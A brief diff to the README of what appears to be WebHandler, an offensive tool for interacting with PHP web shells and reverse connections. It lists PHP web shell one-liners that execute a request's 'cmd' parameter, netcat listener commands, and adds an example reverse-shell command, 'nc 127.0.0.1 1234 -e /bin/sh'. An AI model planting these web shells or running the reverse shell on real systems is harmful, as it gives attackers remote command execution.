@@ -17,7 +17,7 @@ It also supports HTTP proxies (`--proxy http://<ip>:<port>`)
     - `<?php exec($_POST['cmd']); ?>`
     - `<?php passthru($_REQUEST['cmd']); ?>`
 
-* WebHandler is a replacement for netcat with a reverse connection:
+* WebHandler is a replacement for netcat with a reverse connection (_e.g. `nc 127.0.0.1 1234 -e /bin/sh`_):
     - `netcat -l -p 1234`
     - `nc -lvvp 4321`
 
